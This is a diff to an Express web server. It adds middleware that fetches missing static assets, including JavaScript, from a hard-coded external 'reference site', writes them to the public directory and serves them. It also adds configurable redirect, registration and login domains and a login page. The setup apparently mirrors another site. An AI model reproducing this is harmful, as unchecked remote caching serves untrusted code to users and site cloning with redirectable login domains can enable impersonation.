@@ -45,11 +45,65 @@ app.get('/js/auth.js', (req, res) => {
 // Serve static files from public directory
 app.use(express.static(path.join(__dirname, 'public')));
 
+// Middleware to proxy and cache missing static assets dynamically from the reference site
+app.use((req, res, next) => {
+  if (req.method !== 'GET') return next();
+  
+  const isAsset = /\.(png|jpe?g|gif|svg|ico|webp|css|js|woff2?|ttf|otf|mp3|mp4)$/i.test(req.path) || 
+                  req.path.startsWith('/img.alltocon.com/') || 
+                  req.path.startsWith('/img.alltocon.com');
+                  
+  if (!isAsset) return next();
+  
+  const fs = require('fs');
+  const https = require('https');
+  
+  const localPath = path.join(__dirname, 'public', req.path);
+  if (fs.existsSync(localPath)) {
+    return next();
+  }
+  
+  let remoteUrl = '';
+  if (req.path.startsWith('/img.alltocon.com/')) {
+    remoteUrl = `https:/${req.path}`;
+  } else if (req.path.startsWith('/img.alltocon.com')) {
+    remoteUrl = `https:/${req.path}`;
+  } else {
+    remoteUrl = `https://www.t12026ga6789.com${req.path}`;
+  }
+  
+  const cleanPath = localPath.split('?')[0];
+  const dir = path.dirname(cleanPath);
+  
+  if (!fs.existsSync(dir)) {
+    fs.mkdirSync(dir, { recursive: true });
+  }
+  
+  const fileStream = fs.createWriteStream(cleanPath);
+  https.get(remoteUrl, (response) => {
+    if (response.statusCode === 200) {
+      response.pipe(fileStream);
+      fileStream.on('finish', () => {
+        fileStream.close();
+        res.sendFile(cleanPath);
+      });
+    } else {
+      fileStream.close();
+      if (fs.existsSync(cleanPath)) fs.unlinkSync(cleanPath);
+      next();
+    }
+  }).on('error', () => {
+    fileStream.close();
+    if (fs.existsSync(cleanPath)) fs.unlinkSync(cleanPath);
+    next();
+  });
+});
+
 
 // Middleware to automatically detect mobile User-Agents and render mobile views if available
 app.use((req, res, next) => {
   const ua = req.headers['user-agent'] || '';
-  const isMobile = /mobile|android|iphone|ipad|phone/i.test(ua);
+  const isMobile = /mobile|android|iphone|ipad|phone/i.test(ua) || req.query.device === 'mobile' || req.query.mobile === 'true';
   
   const originalRender = res.render;
   res.render = function (view, options, callback) {
@@ -68,9 +122,9 @@ app.use((req, res, next) => {
 
 // Global app locals initialization
 app.locals.domainConfig = {
-  redirectDomain: '',
-  regDomain: '',
-  loginDomain: '',
+  redirectDomain: process.env.REDIRECT_DOMAIN || '',
+  regDomain: process.env.REG_DOMAIN || '',
+  loginDomain: process.env.LOGIN_DOMAIN || '',
 };
 app.locals.recentLogs = [];
 
@@ -196,6 +250,11 @@ app.get('/promotions', (req, res) => {
 // Signup route
 app.get('/signup', (req, res) => {
   res.render('signup');
+});
+
+// Login route
+app.get('/login', (req, res) => {
+  res.render('login');
 });
 
 
